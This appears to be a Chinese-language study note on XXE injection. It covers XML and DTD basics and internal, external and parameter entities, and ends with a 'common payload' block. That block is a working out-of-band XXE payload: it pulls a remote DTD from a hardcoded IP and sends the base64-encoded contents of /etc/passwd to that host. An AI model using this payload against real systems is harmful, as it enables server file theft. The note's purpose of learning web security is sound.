# xxe

## 链接

https://thief.one/2017/06/20/1/

https://v0w.top/2019/01/20/XXE-note/

https://www.freebuf.com/articles/web/177979.html

https://www.w3school.com.cn/xml/xml_intro.asp

 https://www.anquanke.com/post/id/156227#h2-1 

 https://www.anquanke.com/post/id/155328 

## xml语法基础

xml 是语法类似html

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note>
```

`<note>`:根元素

所有元素均可拥有文本内容和属性（类似 HTML 中）。

#### xml特性

- 所有xml元素必须有关闭标签
- xml标签对大小写敏感
- xml文档必须有根元素
- xml属性值必须加引号
- 在 XML 中，文档中的空格不会被删节

#### xml dtd

这里我们要关注的是外部实体,和引用实体

##### dtd定义

文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。

DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。

##### 内部的 DOCTYPE 声明

假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：

```
<!DOCTYPE 根元素 [元素声明]>
```

带有 DTD 的 XML 文档实例：

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE note [			这是DTD内部声明		  <!ELEMENT note (to,from,heading,body)>  
 <!ELEMENT to      (#PCDATA)>  
 <!ELEMENT from    (#PCDATA)>  
 <!ELEMENT heading (#PCDATA)> 
 <!ELEMENT body    (#PCDATA)>
 ]>							
<note>  
<to>George</to>  
<from>John</from>  
<heading>Reminder</heading>  
<body>Don't forget the meeting!</body>
</note>
```

**以上 DTD 解释如下：**

- **!DOCTYPE note** (第二行)定义此文档是 *note* 类型的文档。

- **!ELEMENT note** (第三行)定义 *note* 元素有四个元素：”to、from、heading,、body”

- **!ELEMENT to** (第四行)定义 *to* 元素为 “#PCDATA” 类型

  (之后类似)

**这里有一个小重点Tips：**

- “#PCDATA” 类型为被解析的字符数据（parsed character data）。表示读文件按照XML格式进行解析
- “#CDATA”类型为字符数据（character data）。表示读文件但是不用解析，直接读文件的原始内容

##### dtd元素

`<!ELEMENT 元素名称 类别>`

`<!ELEMENT 元素名称 (元素内容)>`

##### 一个内部实体声明

语法：

```repl
<!ENTITY 实体名称 "实体的值">
```

例子：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo 
[
<!ELEMENT foo ANY >
<!ENTITY xxe "test" >
]
>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```

我们使用 &xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &xxe 就会被 “test” 替换。

##### 一个外部实体声明

语法：

```
<!ENTITY 实体名称 SYSTEM "URI/URL">
```

例子：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo 
[
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/test.dtd" >
]>
<creds>    
<user>&xxe;</user>    
<pass>mypass</pass>
</creds>
```

##### 参数实体：

```xml
<!ENTITY % 实体名称 "实体的值">或者<!ENTITY % 实体名称 SYSTEM "URI">
```

参数实体只能在DTD中调用,调用方法:`%实体名称`







## 有回显的任意文件读取

## 常用payload

```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE roottag [ 
<!ENTITY % dtd SYSTEM "http://39.108.164.219:60001/evil.txt"> 
%dtd;%int;%send; ]> 

evil.txt
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'http://39.108.164.219:60000/?p=%file;'>">
```

通过 `<![CDATA[`和 `]]>`将payload包裹起来，使其不解析为XML就可以读取文件

